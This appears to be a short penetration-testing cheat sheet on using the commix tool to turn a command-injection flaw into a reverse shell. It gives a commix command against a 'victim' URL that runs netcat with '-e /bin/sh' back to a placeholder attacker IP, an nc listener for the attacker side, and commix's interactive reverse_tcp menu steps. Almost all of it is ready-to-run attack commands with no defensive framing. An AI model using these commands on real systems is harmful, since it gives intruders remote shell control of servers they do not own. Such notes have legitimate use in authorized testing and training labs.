Commix Reverse Shell
====================

READ THIS LINK!!
https://github.com/commixproject/commix/wiki/Reverse-Shells

Load from saved file (contains cookies, tokens, etc
---------------------------------------------------
```bash
commix -r /must/use/full/path/to/file.txt
```
Technique 1
-----------
```bash
commix -u 'http://victim.ip.address/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh attacker.ip.adddress 1234"
```
Technique 2
-----------
On Attacker
-------------
````bash
nc -lvp 1234
````

On Victim
------------
```bash
os_shell
commix(os_shell)
reverse_tcp
set LHOST attackers.ip.address
set LPORT 1234

---[ Reverse TCP shells ]---     
Type '1' to use a netcat reverse TCP shell.
Type '2' for other reverse TCP shells.

1

---[ Unix-like targets ]--- 
Type '1' to use the default Netcat on target host.
Type '2' to use Netcat for Busybox on target host.
Type '3' to use Netcat-Traditional on target host. 
Type '4' to use Netcat-Openbsd on target host. 

3
```
